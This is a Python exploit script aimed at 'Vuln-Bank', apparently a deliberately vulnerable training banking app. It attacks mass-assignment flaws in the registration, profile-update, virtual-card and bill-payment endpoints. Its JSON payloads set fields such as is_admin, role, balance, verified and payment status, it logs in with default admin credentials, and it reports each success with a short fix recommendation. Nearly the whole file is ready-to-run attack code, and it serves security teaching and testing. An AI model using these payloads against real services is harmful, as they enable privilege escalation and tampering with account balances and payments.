#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Exploit for Vuln-Bank

This script demonstrates the Mass Assignment vulnerability in the Vuln-Bank application
by exploiting endpoints that don't properly filter input parameters, allowing attackers
to modify sensitive properties that should be protected.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import time

def login(base_url, username="admin", password="admin123"):
    """
    Login to get a valid JWT token
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to use for login
        password: Password to use for login
        
    Returns:
        tuple: (token, user_data) if login successful, (None, None) otherwise
    """
    print(f"[*] Logging in as {username}...")
    
    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print(f"[+] Login successful! Got valid JWT token.")
                return (token, data)
            else:
                print(f"[-] Login successful but no token received.")
                return (None, None)
        else:
            print(f"[-] Login failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return (None, None)
    except Exception as e:
        print(f"[-] Error during login: {str(e)}")
        return (None, None)

def exploit_registration_mass_assignment(base_url):
    """
    Exploit mass assignment vulnerability in the registration endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        bool: True if exploitation successful, False otherwise
    """
    print(f"[*] Attempting to exploit mass assignment in registration...")
    
    register_url = f"{base_url}/register"
    headers = {"Content-Type": "application/json"}
    
    # Include sensitive properties that should not be settable during registration
    payload = {
        "username": f"hacker_{int(time.time())}",  # Unique username
        "password": "Password123!",
        "is_admin": True,  # Attempt to create an admin account
        "balance": 9999999.99,  # Attempt to set initial balance
        "account_type": "premium",  # Attempt to set account type
        "verified": True  # Attempt to set verified status
    }
    
    try:
        response = requests.post(register_url, headers=headers, json=payload)
        
        print(f"[*] Registration response status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"[*] Registration response: {json.dumps(data, indent=2)}")
            
            # Check if the registration was successful
            if data.get('status') == 'success':
                print(f"[+] Registration successful!")
                
                # Check if sensitive properties were set
                debug_data = data.get('debug_data', {})
                
                if debug_data.get('is_admin') == True:
                    print(f"[!] VULNERABILITY: Successfully created admin account via mass assignment!")
                    return True
                
                if debug_data.get('balance') == 9999999.99:
                    print(f"[!] VULNERABILITY: Successfully set initial balance via mass assignment!")
                    return True
                
                if 'account_type' in debug_data and debug_data.get('account_type') == 'premium':
                    print(f"[!] VULNERABILITY: Successfully set account type via mass assignment!")
                    return True
                
                if 'verified' in debug_data and debug_data.get('verified') == True:
                    print(f"[!] VULNERABILITY: Successfully set verified status via mass assignment!")
                    return True
                
                # Check if any of our extra fields were registered
                fields_registered = debug_data.get('fields_registered', [])
                sensitive_fields = ['is_admin', 'balance', 'account_type', 'verified']
                
                for field in sensitive_fields:
                    if field in fields_registered:
                        print(f"[!] VULNERABILITY: Sensitive field '{field}' was registered via mass assignment!")
                        return True
                
                print(f"[+] No obvious mass assignment vulnerability detected in registration.")
                return False
            else:
                print(f"[-] Registration failed: {data.get('message')}")
                return False
        else:
            print(f"[-] Registration failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error during registration mass assignment exploitation: {str(e)}")
        return False

def exploit_profile_update_mass_assignment(base_url, token, user_data):
    """
    Exploit mass assignment vulnerability in the profile update endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token to use for authentication
        user_data: User data from login response
        
    Returns:
        bool: True if exploitation successful, False otherwise
    """
    print(f"[*] Attempting to exploit mass assignment in profile update...")
    
    # Get the user's account number
    account_number = user_data.get('accountNumber')
    if not account_number:
        print(f"[-] Could not get account number from login response.")
        return False
    
    # Try to update user profile with sensitive properties
    update_url = f"{base_url}/api/update_profile"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    
    # Include sensitive properties that should not be modifiable
    payload = {
        "name": "Updated Name",
        "email": "updated@example.com",
        "is_admin": True,  # Attempt to elevate privileges
        "balance": 9999999.99,  # Attempt to modify balance
        "account_number": account_number,  # Required for identification
        "role": "admin",  # Another way to attempt privilege escalation
        "verified": True,  # Attempt to set verified status
        "account_status": "premium"  # Attempt to upgrade account
    }
    
    try:
        response = requests.post(update_url, headers=headers, json=payload)
        
        print(f"[*] Update profile response status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"[*] Update profile response: {json.dumps(data, indent=2)}")
            
            # Check if the update was successful
            if data.get('status') == 'success':
                print(f"[+] Profile update successful!")
                
                # Check if sensitive properties were updated
                sensitive_fields = ['is_admin', 'balance', 'role', 'verified', 'account_status']
                for field in sensitive_fields:
                    if field in data:
                        print(f"[!] VULNERABILITY: Successfully updated sensitive property '{field}' via mass assignment!")
                        return True
                
                # Check if debug info contains updated fields
                if 'debug_info' in data and 'updated_fields' in data['debug_info']:
                    updated_fields = data['debug_info']['updated_fields']
                    for field in sensitive_fields:
                        if field in updated_fields:
                            print(f"[!] VULNERABILITY: Successfully updated sensitive property '{field}' via mass assignment!")
                            return True
                
                print(f"[+] No obvious mass assignment vulnerability detected in profile update.")
                return False
            else:
                print(f"[-] Profile update failed: {data.get('message')}")
                return False
        else:
            print(f"[-] Profile update failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error during profile update mass assignment exploitation: {str(e)}")
        return False

def exploit_create_virtual_card_mass_assignment(base_url, token):
    """
    Exploit mass assignment vulnerability in the create virtual card endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token to use for authentication
        
    Returns:
        bool: True if exploitation successful, False otherwise
    """
    print(f"[*] Attempting to exploit mass assignment in create virtual card...")
    
    create_card_url = f"{base_url}/api/virtual-cards/create"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    
    # Include sensitive properties that should not be settable
    payload = {
        "card_limit": 10000,  # Normal property
        "card_type": "standard",  # Normal property
        "current_balance": 10000,  # Sensitive property that should not be settable
        "is_active": True,  # Sensitive property
        "is_frozen": False,  # Sensitive property
        "last_used_at": "2025-05-09T00:00:00Z"  # Sensitive property
    }
    
    try:
        response = requests.post(create_card_url, headers=headers, json=payload)
        
        print(f"[*] Create virtual card response status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"[*] Create virtual card response: {json.dumps(data, indent=2)}")
            
            # Check if the card creation was successful
            if data.get('status') == 'success':
                print(f"[+] Virtual card creation successful!")
                
                # Check if card details contain our sensitive properties
                card_details = data.get('card_details', {})
                
                sensitive_fields = ['current_balance', 'is_active', 'is_frozen', 'last_used_at']
                for field in sensitive_fields:
                    if field in card_details:
                        value = card_details[field]
                        expected_value = payload[field]
                        
                        # Check if the value matches what we set
                        if value == expected_value or (isinstance(value, (int, float)) and isinstance(expected_value, (int, float)) and abs(value - expected_value) < 0.01):
                            print(f"[!] VULNERABILITY: Successfully set sensitive property '{field}' via mass assignment!")
                            return True
                
                print(f"[+] No obvious mass assignment vulnerability detected in create virtual card.")
                return False
            else:
                print(f"[-] Virtual card creation failed: {data.get('message')}")
                return False
        else:
            print(f"[-] Virtual card creation failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error during create virtual card mass assignment exploitation: {str(e)}")
        return False

def exploit_bill_payment_mass_assignment(base_url, token):
    """
    Exploit mass assignment vulnerability in the bill payment endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token to use for authentication
        
    Returns:
        bool: True if exploitation successful, False otherwise
    """
    print(f"[*] Attempting to exploit mass assignment in bill payment...")
    
    payment_url = f"{base_url}/api/bill-payments/create"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    
    # Include sensitive properties that should not be settable
    payload = {
        "biller_id": 1,  # Normal property
        "amount": 100,  # Normal property
        "payment_method": "balance",  # Normal property
        "description": "Test payment",  # Normal property
        "status": "completed",  # Sensitive property that should not be settable
        "processed_at": "2025-05-09T00:00:00Z",  # Sensitive property
        "reference_number": "CUSTOM-REF-123",  # Sensitive property
        "admin_approved": True  # Sensitive property
    }
    
    try:
        response = requests.post(payment_url, headers=headers, json=payload)
        
        print(f"[*] Bill payment response status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"[*] Bill payment response: {json.dumps(data, indent=2)}")
            
            # Check if the payment was successful
            if data.get('status') == 'success':
                print(f"[+] Bill payment successful!")
                
                # Check if payment details contain our sensitive properties
                payment_details = data.get('payment_details', {})
                
                sensitive_fields = ['status', 'processed_at', 'reference_number', 'admin_approved']
                for field in sensitive_fields:
                    if field in payment_details:
                        value = payment_details[field]
                        expected_value = payload[field]
                        
                        # Check if the value matches what we set
                        if value == expected_value:
                            print(f"[!] VULNERABILITY: Successfully set sensitive property '{field}' via mass assignment!")
                            return True
                
                # Check if reference number matches our custom one
                if 'reference' in payment_details and payment_details['reference'] == payload['reference_number']:
                    print(f"[!] VULNERABILITY: Successfully set custom reference number via mass assignment!")
                    return True
                
                print(f"[+] No obvious mass assignment vulnerability detected in bill payment.")
                return False
            else:
                print(f"[-] Bill payment failed: {data.get('message')}")
                return False
        else:
            print(f"[-] Bill payment failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error during bill payment mass assignment exploitation: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Exploit Mass Assignment vulnerabilities in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    parser.add_argument("--username", default="admin", help="Username to use for login")
    parser.add_argument("--password", default="admin123", help="Password to use for login")
    args = parser.parse_args()
    
    print("=== Vuln-Bank Mass Assignment Vulnerabilities Exploit ===")
    print(f"[*] Target: {args.url}")
    
    # Step 1: Exploit registration mass assignment
    registration_success = exploit_registration_mass_assignment(args.url)
    
    # Step 2: Login to get a token
    token, user_data = login(args.url, args.username, args.password)
    if not token:
        print("[-] Failed to get a valid token. Skipping authenticated tests.")
    else:
        # Step 3: Exploit profile update mass assignment
        profile_update_success = exploit_profile_update_mass_assignment(args.url, token, user_data)
        
        # Step 4: Exploit create virtual card mass assignment
        create_card_success = exploit_create_virtual_card_mass_assignment(args.url, token)
        
        # Step 5: Exploit bill payment mass assignment
        bill_payment_success = exploit_bill_payment_mass_assignment(args.url, token)
    
    # Step 6: Summarize findings
    print("\n=== Vulnerability Summary ===")
    
    if registration_success:
        print("[!] VULNERABILITY: Mass Assignment in Registration")
        print("    Impact: Attackers can create accounts with elevated privileges or custom properties.")
        print("    Recommendation: Implement a whitelist of allowed properties for registration.")
    
    if token:
        if profile_update_success:
            print("[!] VULNERABILITY: Mass Assignment in Profile Update")
            print("    Impact: Attackers can modify sensitive properties like admin status or balance.")
            print("    Recommendation: Implement a whitelist of allowed properties for profile updates.")
        
        if create_card_success:
            print("[!] VULNERABILITY: Mass Assignment in Virtual Card Creation")
            print("    Impact: Attackers can create cards with custom properties like balance.")
            print("    Recommendation: Implement a whitelist of allowed properties for card creation.")
        
        if bill_payment_success:
            print("[!] VULNERABILITY: Mass Assignment in Bill Payment")
            print("    Impact: Attackers can create payments with custom status or reference numbers.")
            print("    Recommendation: Implement a whitelist of allowed properties for payments.")
    
    if not (registration_success or (token and (profile_update_success or create_card_success or bill_payment_success))):
        print("[+] No Mass Assignment vulnerabilities detected.")
    
    print("\n[*] Exploitation complete.")

if __name__ == "__main__":
    main()
